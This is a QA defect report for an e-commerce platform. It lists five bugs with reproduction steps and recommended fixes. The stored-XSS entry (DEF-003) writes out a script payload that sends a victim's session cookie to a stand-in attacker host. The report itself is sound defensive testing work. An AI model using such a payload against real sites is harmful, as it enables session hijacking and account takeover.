# Defect / Bug Report

## BuildNest E-Commerce Platform

**Document ID:** DBR-BUILDNEST-001
**Version:** 2.0
**Date:** 2026-02-11
**Standard:** ISO/IEC/IEEE 29119:2021

---

## 1. Defect Dashboard

| Metric                     | Value                             |
| :------------------------- | :-------------------------------- |
| **Total Defects**          | 5                                 |
| **S1 (Critical)**          | 1                                 |
| **S2 (Major)**             | 1                                 |
| **S3 (Minor)**             | 2                                 |
| **S4 (Trivial)**           | 1                                 |
| **Open**                   | 5                                 |
| **Resolved**               | 0                                 |
| **Release Recommendation** | **NO — S1 defect blocks release** |

---

## 2. Defect Details

### DEF-001: Rate Limit Counter Flaky in Tests

| Attribute       | Value                                        |
| :-------------- | :------------------------------------------- |
| **Severity**    | S3 (Minor)                                   |
| **Priority**    | P3                                           |
| **Status**      | Open                                         |
| **Module**      | Auth / Rate Limiting                         |
| **Reporter**    | QA Team                                      |
| **Detected By** | TC-AUTH-015                                  |
| **Component**   | `RateLimiterService`, `AdminRateLimitFilter` |

**Description:** Rate limit counter does not reliably reset between test runs, causing intermittent false positives where requests are rejected as rate-limited even at the start of a test.

**Steps to Reproduce:**

1. Run TC-AUTH-015 (Rate Limiting Effectiveness) in full test suite.
2. Observe that rate limit counter sometimes starts at a non-zero value.
3. First request may be rejected with 429.

**Root Cause Analysis:** The `RateLimiterService` uses a shared counter that is not reset between test lifecycle events. Redis-backed rate limiting works correctly in production due to TTL expiry.

**Recommended Fix:**

```java
// Option 1: Reset counter in @BeforeEach
@BeforeEach
void resetRateLimit() {
    rateLimiterService.resetCounters();
}

// Option 2: Use @DirtiesContext to reload context
@DirtiesContext(classMode = ClassMode.AFTER_EACH_TEST_METHOD)
```

**Impact:** Tests only — production rate limiting works correctly.

---

### DEF-002: Inventory Not Released on Payment Failure

| Attribute       | Value                  |
| :-------------- | :--------------------- |
| **Severity**    | S2 (Major)             |
| **Priority**    | P1                     |
| **Status**      | Open                   |
| **Module**      | Checkout / Inventory   |
| **Detected By** | TC-CHK-005, TC-INT-003 |
| **Component**   | `CheckoutService`      |

**Description:** When payment verification fails after inventory reservation, the reserved stock is not released. This causes "phantom reservations" that permanently reduce available stock.

**Steps to Reproduce:**

1. User adds product (stock=50) to cart.
2. User initiates checkout → 10 units reserved.
3. Payment signature verification fails.
4. Expected: Available stock = 50. Actual: Available stock = 40.

**Root Cause Analysis:** The `CheckoutService.processCheckout()` method does not call `InventoryService.releaseReservation()` in the catch block for `PaymentVerificationException`.

**Recommended Fix:**

```java
// In CheckoutService.processCheckout():
try {
    paymentService.verifySignature(paymentId, orderId, signature);
    // ... create order, deduct stock
} catch (PaymentVerificationException e) {
    // CRITICAL: Release reserved inventory
    for (CartItem item : cart.getItems()) {
        inventoryService.releaseReservation(item.getProductId(), item.getQuantity());
    }
    throw new CheckoutFailedException("Payment verification failed", e);
}
```

**Impact:** High — can lead to products appearing out of stock when they are actually available.

---

### DEF-003: Stored XSS in Product Review Comments

| Attribute       | Value                                                            |
| :-------------- | :--------------------------------------------------------------- |
| **Severity**    | **S1 (Critical)**                                                |
| **Priority**    | **P0**                                                           |
| **Status**      | Open                                                             |
| **Module**      | Review                                                           |
| **Detected By** | TC-REV-002, TC-SEC-012                                           |
| **Component**   | `ProductReviewService.submitReview()`, `ProductReviewController` |

**Description:** The `comment` field in product reviews accepts raw HTML input including `<script>` tags. When the comment is displayed to other users, the script executes in their browser context (Stored XSS).

**Steps to Reproduce:**

1. Authenticate as user `john_doe`.
2. POST to `/api/user/reviews/product/1`:

```json
{
  "rating": 5,
  "comment": "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
}
```

3. System stores the review with raw HTML.
4. Another user views product reviews.
5. Script executes, potentially stealing session cookies.

**Root Cause Analysis:** No input sanitization on `ProductReview.comment` field. The `@Size(max=2000)` annotation validates length but not content. No output encoding is applied when rendering reviews.

**Recommended Fix (Backend):**

```java
// 1. Add HTML sanitization in ProductReviewService
import org.owasp.html.HtmlPolicyBuilder;
import org.owasp.html.PolicyFactory;

private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
    .allowElements("b", "i", "em", "strong")
    .toFactory();

public ProductReview submitReview(ReviewDTO dto) {
    String sanitizedComment = POLICY.sanitize(dto.getComment());
    // ... create review with sanitizedComment
}

// 2. Add Content-Security-Policy header (already partially done in SecurityConfig)
// 3. Add @XSSProtected custom annotation for automated validation
```

**Recommended Fix (Frontend):**

```javascript
// Use DOMPurify for output encoding
import DOMPurify from "dompurify";
const SafeComment = ({ comment }) => (
  <span dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment) }} />
);
```

**OWASP Classification:** A7:2017 – Cross-Site Scripting (XSS)
**Impact:** **Release blocker.** Session hijacking, cookie theft, user impersonation.

---

### DEF-004: Negative Quantity Accepted in Cart/Inventory

| Attribute       | Value                             |
| :-------------- | :-------------------------------- |
| **Severity**    | S3 (Minor)                        |
| **Priority**    | P3                                |
| **Status**      | Open                              |
| **Module**      | Cart, Inventory                   |
| **Detected By** | TC-EDGE-003                       |
| **Component**   | `CartService`, `InventoryService` |

**Description:** Negative quantity values are accepted when adding items to cart or when setting stock levels via admin API. This leads to invalid data states.

**Steps to Reproduce:**

1. POST to `/api/user/cart/{userId}` with `{"productId": 1, "quantity": -5}`.
2. Item added with quantity -5.
3. Cart total calculation returns negative amount.

**Recommended Fix:**

```java
// Add validation annotation to CartItem
@Min(value = 1, message = "Quantity must be at least 1")
private Integer quantity;

// Add service-level check
if (quantity <= 0) {
    throw new ValidationException("Quantity must be positive");
}
```

---

### DEF-005: Empty Cart Total Returns Null

| Attribute       | Value                        |
| :-------------- | :--------------------------- |
| **Severity**    | S4 (Trivial)                 |
| **Priority**    | P4                           |
| **Status**      | Open                         |
| **Module**      | Cart                         |
| **Detected By** | TC-EDGE-010                  |
| **Component**   | `CartService.getCartTotal()` |

**Description:** When cart has no items, `getCartTotal()` returns `null` instead of `0.00`.

**Steps to Reproduce:**

1. Authenticate as user with empty cart.
2. GET `/api/user/cart/{userId}/total`.
3. Response: `{"total": null}` instead of `{"total": 0.00}`.

**Recommended Fix:**

```java
public BigDecimal getCartTotal(Long userId) {
    Cart cart = getCart(userId);
    if (cart.getItems().isEmpty()) {
        return BigDecimal.ZERO;
    }
    return cart.getItems().stream()
        .map(item -> item.getUnitPrice().multiply(BigDecimal.valueOf(item.getQuantity())))
        .reduce(BigDecimal.ZERO, BigDecimal::add);
}
```

---

## 3. Resolution Priority

| Priority | Defect                          | Action Required Before Release        |
| :------- | :------------------------------ | :------------------------------------ |
| **P0**   | DEF-003 (Stored XSS)            | Must fix — add OWASP HTML sanitizer   |
| **P1**   | DEF-002 (Inventory rollback)    | Must fix — add release in catch block |
| **P3**   | DEF-001 (Rate limit test flaky) | Should fix — test-only impact         |
| **P3**   | DEF-004 (Negative quantity)     | Should fix — add validation           |
| **P4**   | DEF-005 (Null cart total)       | Can fix in next sprint                |

---

## 4. Release Recommendation

> [!CAUTION]
> **DO NOT RELEASE** until DEF-003 (Stored XSS, S1) and DEF-002 (Inventory rollback, S2) are resolved and verified. These defects represent security vulnerabilities and data integrity risks that are unacceptable for production.

---

## 5. Revision History

| Version | Date       | Author       | Changes                                                                            |
| :------ | :--------- | :----------- | :--------------------------------------------------------------------------------- |
| 1.0     | 2026-02-10 | BuildNest QA | Initial — 5 defects                                                                |
| 2.0     | 2026-02-11 | BuildNest QA | Updated with TC cross-references to 124 test suite; added code fix recommendations |

---

**— End of Document —**
